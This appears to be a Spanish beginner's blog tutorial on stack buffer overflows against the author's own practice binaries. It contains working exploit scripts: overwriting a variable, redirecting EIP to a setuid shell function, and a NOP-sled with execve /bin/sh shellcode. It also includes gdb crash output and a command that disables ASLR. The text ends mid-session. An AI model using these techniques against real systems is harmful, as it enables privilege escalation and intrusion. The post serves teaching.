<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Buffer Overflow For Beginners and Ret2libc | MiguelRega7 - blog</title>
<meta name="generator" content="Jekyll v4.3.2" />
<meta property="og:title" content="Buffer Overflow For Beginners and Ret2libc" />
<meta name="author" content="MiguelRega7" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Posts sobre resolución de CTFs y ciberseguridad." />
<meta property="og:description" content="Posts sobre resolución de CTFs y ciberseguridad." />
<link rel="canonical" href="http://localhost:4000/vulnhub/machines/2024/05/03/buffer.html" />
<meta property="og:url" content="http://localhost:4000/vulnhub/machines/2024/05/03/buffer.html" />
<meta property="og:site_name" content="MiguelRega7 - blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2024-05-03T00:00:00-06:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Buffer Overflow For Beginners and Ret2libc" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"MiguelRega7"},"dateModified":"2024-05-03T00:00:00-06:00","datePublished":"2024-05-03T00:00:00-06:00","description":"Posts sobre resolución de CTFs y ciberseguridad.","headline":"Buffer Overflow For Beginners and Ret2libc","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/vulnhub/machines/2024/05/03/buffer.html"},"url":"http://localhost:4000/vulnhub/machines/2024/05/03/buffer.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="MiguelRega7 - blog" />
</head>
<body><header class="site-header">

  <div class="wrapper"><a class="site-title" rel="author" href="/">MiguelRega7 - blog</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">Buffer Overflow For Beginners and Ret2libc</h1>
    <p class="post-meta"><time class="dt-published" datetime="2024-05-03T00:00:00-06:00" itemprop="datePublished">
        May 3, 2024
      </time></p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <p align="center">
<img src="/assets/vulnhub/buff/icon.png" />
</p>

<h2 id="level-one">Level One</h2>

<blockquote>
  <p>Comparación de caracteres.</p>
</blockquote>

<blockquote>
  <p>Vamos a desactivar el ASRL temporalmente.</p>
</blockquote>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels <span class="nb">echo </span>0 | <span class="nb">sudo tee</span> /proc/sys/kernel/randomize_va_space
0
</code></pre></div></div>

<ul>
  <li>
    <p>Lo primero que vamos hacer es analizar el código que esta escrito en C.</p>
  </li>
  <li>
    <p>Vemos que se esta definiendo un Buffer de tamaño 32 bytes, esta asignado una variable <code class="language-plaintext highlighter-rouge">long key</code> con valor <code class="language-plaintext highlighter-rouge">0x12345678</code>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/vulnhub/buff/1.png" />
</p>

<ul>
  <li>Esta es la parte interesante ya que vemos que si se igual el valor <code class="language-plaintext highlighter-rouge">key</code> a <code class="language-plaintext highlighter-rouge">0x42424242</code> se va ejecutar una <code class="language-plaintext highlighter-rouge">/bin/sh</code> que es el objetivo en caso de que no sea ese valor no se hará nada.</li>
</ul>

<pre><code class="language-C">if(key == 0x42424242) {
        execve("/bin/sh", 0, 0);
    }
    else {
        printf("%s\n", "Sorry try again...");
    }
</code></pre>

<ul>
  <li>Para saber a cuanto equivale el valor <code class="language-plaintext highlighter-rouge">key</code> podemos hacerlo desde <code class="language-plaintext highlighter-rouge">bash</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels <span class="nb">echo</span> <span class="nt">-ne</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">42"</span>
B%
</code></pre></div></div>

<ul>
  <li>
    <p>Como sabemos que equivale ala letra <code class="language-plaintext highlighter-rouge">B</code> vemos que esta igualado a <code class="language-plaintext highlighter-rouge">4</code> <code class="language-plaintext highlighter-rouge">B</code> para poder obtener la <code class="language-plaintext highlighter-rouge">Bash</code> que necesitamos necesitamos enviar el tamaño del Buff que son <code class="language-plaintext highlighter-rouge">32 bytes</code> + las B para que la condición se true y se ejecute.</p>
  </li>
  <li>
    <p>Vamos a crear un script rápido en <code class="language-plaintext highlighter-rouge">python</code> que haga todo lo que necesitamos.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python2</span>

first <span class="o">=</span> b<span class="s2">"A"</span> <span class="k">*</span> 32 <span class="c"># le pasamos 32 veces A para el buffer</span>

key <span class="o">=</span> b<span class="s2">"B"</span> <span class="k">*</span> 4 <span class="c"># le pasamos las 4 B </span>

print<span class="o">(</span>first + key<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Al cumplirse todas las condiciones nos debería de otorgar una <code class="language-plaintext highlighter-rouge">bash</code> como el usuario que esta corriendo el binario en este caso será mi usuario ya que yo lo estoy ejecutando.</p>
  </li>
  <li>
    <p>Allí podemos ver los <code class="language-plaintext highlighter-rouge">prints</code> que se cumplen y por eso nos otorga la <code class="language-plaintext highlighter-rouge">bash</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels ./levelOne <span class="si">$(</span>python2 scriptOne.py<span class="si">)</span>
Buf is: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
Key is: 0x42424242
<span class="nv">$ </span><span class="nb">whoami
</span>miguel
</code></pre></div></div>

<h2 id="leveltwo">LevelTwo</h2>

<blockquote>
  <p>Llamada a la dirección de una función que te otorga una /bin/sh.</p>
</blockquote>

<ul>
  <li>
    <p>Continuamos con el nivel 2 vamos a ver el código.</p>
  </li>
  <li>
    <p>En este caso vemos que en el código se esta definiendo el <code class="language-plaintext highlighter-rouge">uid</code> al propietario del binario ósea <code class="language-plaintext highlighter-rouge">level2</code> ya que este es el segundo binario el <code class="language-plaintext highlighter-rouge">uid</code> funciona para almacenar identificadores de usuario, es el identificador de usuario en Linux y antes del return podemos ver que esta llamando a una función llamada <code class="language-plaintext highlighter-rouge">hello</code>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/vulnhub/buff/2.png" />
</p>

<ul>
  <li>En esta imagen vemos el código de la función <code class="language-plaintext highlighter-rouge">hello</code> que se esta usando en el código.</li>
</ul>

<p align="center">
<img src="/assets/vulnhub/buff/3.png" />
</p>

<ul>
  <li>
    <p>Vemos que se define un tamaño de 28 bytes y usa <code class="language-plaintext highlighter-rouge">strcpy</code> que copea el argumento que le pasas.</p>
  </li>
  <li>
    <p>Si inspeccionamos la funciona <code class="language-plaintext highlighter-rouge">spawn</code> tenemos que pasarle 3 argumentos para que nos de una <code class="language-plaintext highlighter-rouge">Bash</code>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/vulnhub/buff/4.png" />
</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">spawn</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="c1">//privilegios de super usuario</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">args</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">};</span>  <span class="c1">// Argumentos para /bin/sh</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">env</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="nb">NULL</span><span class="p">};</span>  <span class="c1">// No se pasan variables de entorno</span>
  <span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="n">args</span><span class="p">,</span> <span class="n">env</span><span class="p">);</span> <span class="c1">// se interpreta la bash</span>
  <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<ul>
  <li>Para empezar vamos a usar <code class="language-plaintext highlighter-rouge">gdb</code> que es un <code class="language-plaintext highlighter-rouge">debugger</code> y lo usaremos junto con peda <a href="https://github.com/longld/peda">https://github.com/longld/peda</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels gdb <span class="nt">-q</span> levelTwo
Reading symbols from levelTwo...
<span class="o">(</span>No debugging symbols found <span class="k">in </span>levelTwo<span class="o">)</span>
gdb-peda<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>En el código vimos que se esta definiendo que son 28 bytes de buffer a si que vamos a enviar 100 bytes para ver si se corrompe el binario.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>pattern_arg 100
Set 1 arguments to program
</code></pre></div></div>

<ul>
  <li>Ahora lo corremos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>run
Starting program: /home/miguel/StackOverflow/levels/levelTwo <span class="s1">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'</span>
<span class="o">[</span>Thread debugging using libthread_db enabled]
Using host libthread_db library <span class="s2">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span class="nb">.</span>
Hello AAA%AAsAABAA<span class="nv">$AAnAACAA</span><span class="nt">-AA</span><span class="o">(</span>AADAA<span class="p">;</span>AA<span class="o">)</span>AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL

Program received signal SIGSEGV, Segmentation fault.
Warning: <span class="s1">'set logging off'</span>, an <span class="nb">alias </span><span class="k">for </span>the <span class="nb">command</span> <span class="s1">'set logging enabled'</span>, is deprecated.
Use <span class="s1">'set logging enabled off'</span><span class="nb">.</span>

Warning: <span class="s1">'set logging on'</span>, an <span class="nb">alias </span><span class="k">for </span>the <span class="nb">command</span> <span class="s1">'set logging enabled'</span>, is deprecated.
Use <span class="s1">'set logging enabled on'</span><span class="nb">.</span>
<span class="o">[</span><span class="nt">----------------------------------registers-----------------------------------</span><span class="o">]</span>
EAX: 0x6b <span class="o">(</span><span class="s1">'k'</span><span class="o">)</span>
EBX: 0x413b4141 <span class="o">(</span><span class="s1">'AA;A'</span><span class="o">)</span>
ECX: 0xffffcf0c <span class="nt">--</span><span class="o">&gt;</span> 0x2e6b3000 <span class="o">(</span><span class="s1">''</span><span class="o">)</span>
EDX: 0x1
ESI: 0xffffcfe0 <span class="nt">--</span><span class="o">&gt;</span> 0x2
EDI: 0xf7ffcba0 <span class="nt">--</span><span class="o">&gt;</span> 0x0
EBP: 0x41412941 <span class="o">(</span><span class="s1">'A)AA'</span><span class="o">)</span>
ESP: 0xffffcf90 <span class="o">(</span><span class="s2">"AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span><span class="o">)</span>
EIP: 0x61414145 <span class="o">(</span><span class="s1">'EAAa'</span><span class="o">)</span>
EFLAGS: 0x10286 <span class="o">(</span>carry PARITY adjust zero SIGN <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
<span class="o">[</span><span class="nt">-------------------------------------code-------------------------------------</span><span class="o">]</span>
Invalid <span class="nv">$PC</span> address: 0x61414145
<span class="o">[</span><span class="nt">------------------------------------stack-------------------------------------</span><span class="o">]</span>
0000| 0xffffcf90 <span class="o">(</span><span class="s2">"AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span><span class="o">)</span>
0004| 0xffffcf94 <span class="o">(</span><span class="s2">"AFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span><span class="o">)</span>
0008| 0xffffcf98 <span class="o">(</span><span class="s2">"bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span><span class="o">)</span>
0012| 0xffffcf9c <span class="o">(</span><span class="s2">"AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span><span class="o">)</span>
0016| 0xffffcfa0 <span class="o">(</span><span class="s2">"AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span><span class="o">)</span>
0020| 0xffffcfa4 <span class="o">(</span><span class="s2">"2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span><span class="o">)</span>
0024| 0xffffcfa8 <span class="o">(</span><span class="s2">"AAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span><span class="o">)</span>
0028| 0xffffcfac <span class="o">(</span><span class="s2">"A3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span><span class="o">)</span>
<span class="o">[</span><span class="nt">------------------------------------------------------------------------------</span><span class="o">]</span>
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x61414145 <span class="k">in</span> ?? <span class="o">()</span>
gdb-peda<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>Ahora lo que tenemos que hacer es buscar el <code class="language-plaintext highlighter-rouge">offset</code> que es un valor para determinar la posicion en la memoria que se va a sobrescribir para esto le vamos a pasar el <code class="language-plaintext highlighter-rouge">EIP</code> que es la dirección de memoria de la próxima instrucción a ejecutar, el objetivo es manipular el valor del registro <code class="language-plaintext highlighter-rouge">EIP</code> para que apunte a una dirección de memoria controlada por nosotros.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>pattern_offset 0x61414145
1631666501 found at offset: 36
</code></pre></div></div>

<ul>
  <li>Ahora vimos que en el código hay una función <code class="language-plaintext highlighter-rouge">spawn</code> y necesitamos saber su dirección a si que vamos a buscarla.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>info <span class="k">function</span> ^spawn<span class="err">$</span>
All functions matching regular expression <span class="s2">"^spawn$"</span>:

Non-debugging symbols:
0x565561e9  spawn
</code></pre></div></div>

<ul>
  <li>Y bueno ya tenemos la dirección pero como estamos en <code class="language-plaintext highlighter-rouge">little endian</code> tenemos que darle la vuelta ala dirección.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x565561e9      |    <span class="se">\x</span>56<span class="se">\x</span>55<span class="se">\x</span>61<span class="se">\x</span>e9    | <span class="se">\x</span>e9<span class="se">\x</span>61<span class="se">\x</span>55<span class="se">\x</span>56
</code></pre></div></div>

<ul>
  <li>Ahora como ya tenemos todo listo podemos seguir con el script para que todo esto funcione.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels <span class="nb">cat </span>scriptTwo.py
<span class="c">#!/usr/bin/python2</span>

offset <span class="o">=</span> 36 <span class="c"># pattern_offset 0x61414145</span>

null <span class="o">=</span> b<span class="s2">"A"</span> <span class="k">*</span> offset <span class="c"># vamos a pasarle eso para asta llegar al EIP</span>

spawn <span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">e9</span><span class="se">\x</span><span class="s2">61</span><span class="se">\x</span><span class="s2">55</span><span class="se">\x</span><span class="s2">56"</span> <span class="c"># Le pasamos la direccion para que el EIP apunte a ala funcion spawn</span>

print<span class="o">(</span>null + spawn<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Y funciona.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels ./levelTwo <span class="si">$(</span>python2 scriptTwo.py<span class="si">)</span>
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�UV
<span class="c"># whoami</span>
root
<span class="c">#</span>
</code></pre></div></div>

<h2 id="level-3">Level 3</h2>

<blockquote>
  <p>Stack Based.</p>
</blockquote>

<ul>
  <li>
    <p>Vamos a observar el código.</p>
  </li>
  <li>
    <p>Después de analizar con <code class="language-plaintext highlighter-rouge">ghidra</code> esta es la funciona <code class="language-plaintext highlighter-rouge">main</code>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/vulnhub/buff/main.png" />
</p>

<ul>
  <li>Esta haciendo casi lo mismo pero ahora llama a la funciona <code class="language-plaintext highlighter-rouge">overflow</code>.</li>
</ul>

<p align="center">
<img src="/assets/vulnhub/buff/main2.png" />
</p>

<ul>
  <li>Ahora define un buffer de <code class="language-plaintext highlighter-rouge">260 bytes</code> y copea el argumento con la función <code class="language-plaintext highlighter-rouge">strcpy</code> que habíamos visto de antes en los binarios anterior, si <code class="language-plaintext highlighter-rouge">param_1</code> contiene más de <code class="language-plaintext highlighter-rouge">260</code> caracteres, los datos adicionales se escribirán en la memoria adyacente a <code class="language-plaintext highlighter-rouge">local_10c</code>, lo que puede provocar un desbordamiento de búfer.</li>
</ul>

<pre><code class="language-C">void overflow(char *param_1)

{
  char local_10c [260];
  
  strcpy(local_10c,param_1);
  printf("Buf: %s\n",local_10c);
  return;
}
</code></pre>

<ul>
  <li>Vamos a volver a usar <code class="language-plaintext highlighter-rouge">gdb</code> para corromper el binario.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels gdb <span class="nt">-q</span> levelThree
Reading symbols from levelThree...
<span class="o">(</span>No debugging symbols found <span class="k">in </span>levelThree<span class="o">)</span>
gdb-peda<span class="nv">$ </span>pattern_arg 300
Set 1 arguments to program
gdb-peda<span class="nv">$ </span>run
Starting program: /home/miguel/StackOverflow/levels/levelThree <span class="s1">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%'</span>
<span class="o">[</span>Thread debugging using libthread_db enabled]
Using host libthread_db library <span class="s2">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span class="nb">.</span>
Buf: AAA%AAsAABAA<span class="nv">$AAnAACAA</span><span class="nt">-AA</span><span class="o">(</span>AADAA<span class="p">;</span>AA<span class="o">)</span>AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%<span class="nv">$A</span>%nA%CA%-A%<span class="o">(</span>A%DA%<span class="p">;</span>A%<span class="o">)</span>A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%

Program received signal SIGSEGV, Segmentation fault.
Warning: <span class="s1">'set logging off'</span>, an <span class="nb">alias </span><span class="k">for </span>the <span class="nb">command</span> <span class="s1">'set logging enabled'</span>, is deprecated.
Use <span class="s1">'set logging enabled off'</span><span class="nb">.</span>

Warning: <span class="s1">'set logging on'</span>, an <span class="nb">alias </span><span class="k">for </span>the <span class="nb">command</span> <span class="s1">'set logging enabled'</span>, is deprecated.
Use <span class="s1">'set logging enabled on'</span><span class="nb">.</span>
<span class="o">[</span><span class="nt">----------------------------------registers-----------------------------------</span><span class="o">]</span>
EAX: 0x132
EBX: 0x25413225 <span class="o">(</span><span class="s1">'%2A%'</span><span class="o">)</span>
ECX: 0xffffd0bc <span class="nt">--</span><span class="o">&gt;</span> 0x13ecbc00
EDX: 0x1
ESI: 0xffffd270 <span class="nt">--</span><span class="o">&gt;</span> 0x2
EDI: 0xf7ffcba0 <span class="nt">--</span><span class="o">&gt;</span> 0x0
EBP: 0x64254148 <span class="o">(</span><span class="s1">'HA%d'</span><span class="o">)</span>
ESP: 0xffffd220 <span class="o">(</span><span class="s2">"%IA%eA%4A%JA%fA%5A%KA%gA%6A%"</span><span class="o">)</span>
EIP: 0x41332541 <span class="o">(</span><span class="s1">'A%3A'</span><span class="o">)</span>
EFLAGS: 0x10282 <span class="o">(</span>carry parity adjust zero SIGN <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
<span class="o">[</span><span class="nt">-------------------------------------code-------------------------------------</span><span class="o">]</span>
Invalid <span class="nv">$PC</span> address: 0x41332541
<span class="o">[</span><span class="nt">------------------------------------stack-------------------------------------</span><span class="o">]</span>
0000| 0xffffd220 <span class="o">(</span><span class="s2">"%IA%eA%4A%JA%fA%5A%KA%gA%6A%"</span><span class="o">)</span>
0004| 0xffffd224 <span class="o">(</span><span class="s2">"eA%4A%JA%fA%5A%KA%gA%6A%"</span><span class="o">)</span>
0008| 0xffffd228 <span class="o">(</span><span class="s2">"A%JA%fA%5A%KA%gA%6A%"</span><span class="o">)</span>
0012| 0xffffd22c <span class="o">(</span><span class="s2">"%fA%5A%KA%gA%6A%"</span><span class="o">)</span>
0016| 0xffffd230 <span class="o">(</span><span class="s2">"5A%KA%gA%6A%"</span><span class="o">)</span>
0020| 0xffffd234 <span class="o">(</span><span class="s2">"A%gA%6A%"</span><span class="o">)</span>
0024| 0xffffd238 <span class="o">(</span><span class="s2">"%6A%"</span><span class="o">)</span>
0028| 0xffffd23c <span class="nt">--</span><span class="o">&gt;</span> 0x0
<span class="o">[</span><span class="nt">------------------------------------------------------------------------------</span><span class="o">]</span>
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41332541 <span class="k">in</span> ?? <span class="o">()</span>
gdb-peda<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>Ahora buscamos el <code class="language-plaintext highlighter-rouge">offset</code> le vamos a pasar el <code class="language-plaintext highlighter-rouge">EIP</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>pattern_offset 0x41332541
1093870913 found at offset: 268
</code></pre></div></div>

<ul>
  <li>Necesitamos 268 bytes para sobrescribir el <code class="language-plaintext highlighter-rouge">EIP</code> como no hay una función que nos otorgue una <code class="language-plaintext highlighter-rouge">bash</code> vamos a definir un <code class="language-plaintext highlighter-rouge">shellcode</code> podemos usar el siguiente <a href="https://www.exploit-db.com/shellcodes/13628">https://www.exploit-db.com/shellcodes/13628</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python2</span>

offset <span class="o">=</span> 268

shellcode  <span class="o">=</span> b<span class="s2">""</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">99</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>
</code></pre></div></div>

<ul>
  <li>Ahora vamos a usar <code class="language-plaintext highlighter-rouge">NOP</code> que no realiza ninguna acción solo es para rellenar el espacio que falta en la memoria para permitir que el flujo del control del programa sea manipulado pero muy importante tenemos que restarle el tamaño del <code class="language-plaintext highlighter-rouge">shellcode</code> por que no podemos pasarnos de <code class="language-plaintext highlighter-rouge">268 bytes</code> para no sobrescribir el <code class="language-plaintext highlighter-rouge">EIP</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels <span class="nb">cat </span>scriptThree.py
<span class="c">#!/usr/bin/python2</span>
<span class="c"># -*- coding: utf-8 -*-</span>

offset <span class="o">=</span> 268 <span class="c">#En el shellcode son las intrucciones maliciosas</span>

shellcode  <span class="o">=</span> b<span class="s2">""</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">99</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>

junk <span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">90"</span> <span class="k">*</span> <span class="o">(</span>offset - len<span class="o">(</span>shellcode<span class="o">))</span> <span class="c">#x90", representa la instrucción "NOP" en lenguaje de máquina</span>
eip <span class="o">=</span> b<span class="s2">"B"</span> <span class="k">*</span> 4 <span class="c">#eip contiene una secuencia de caracteres "B" repetidos 4 veces, lo que representa el valor que se escribirá en el registro EIP.</span>
print<span class="o">(</span>junk + shellcode + eip<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Ahora para probar vamos con <code class="language-plaintext highlighter-rouge">gdb</code> pasando el <code class="language-plaintext highlighter-rouge">script</code> como argumento.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>run <span class="si">$(</span>python2 scriptThree.py<span class="si">)</span>
Starting program: /home/miguel/StackOverflow/levels/levelThree <span class="si">$(</span>python2 scriptThree.py<span class="si">)</span>
<span class="o">[</span>Thread debugging using libthread_db enabled]
Using host libthread_db library <span class="s2">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span class="nb">.</span>
Buf: j
      XRh//shh/bin��BBBB

Program received signal SIGSEGV, Segmentation fault.
Warning: <span class="s1">'set logging off'</span>, an <span class="nb">alias </span><span class="k">for </span>the <span class="nb">command</span> <span class="s1">'set logging enabled'</span>, is deprecated.
Use <span class="s1">'set logging enabled off'</span><span class="nb">.</span>

Warning: <span class="s1">'set logging on'</span>, an <span class="nb">alias </span><span class="k">for </span>the <span class="nb">command</span> <span class="s1">'set logging enabled'</span>, is deprecated.
Use <span class="s1">'set logging enabled on'</span><span class="nb">.</span>
<span class="o">[</span><span class="nt">----------------------------------registers-----------------------------------</span><span class="o">]</span>
EAX: 0x116
EBX: 0xe3896e69
ECX: 0xffffd0dc <span class="nt">--</span><span class="o">&gt;</span> 0xe67ff500
EDX: 0x1
ESI: 0xffffd290 <span class="nt">--</span><span class="o">&gt;</span> 0x2
EDI: 0xf7ffcba0 <span class="nt">--</span><span class="o">&gt;</span> 0x0
EBP: 0x80cdc931
ESP: 0xffffd240 <span class="nt">--</span><span class="o">&gt;</span> 0xffffd400 <span class="nt">--</span><span class="o">&gt;</span> 0x3
EIP: 0x42424242 <span class="o">(</span><span class="s1">'BBBB'</span><span class="o">)</span>
EFLAGS: 0x10286 <span class="o">(</span>carry PARITY adjust zero SIGN <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
<span class="o">[</span><span class="nt">-------------------------------------code-------------------------------------</span><span class="o">]</span>
Invalid <span class="nv">$PC</span> address: 0x42424242
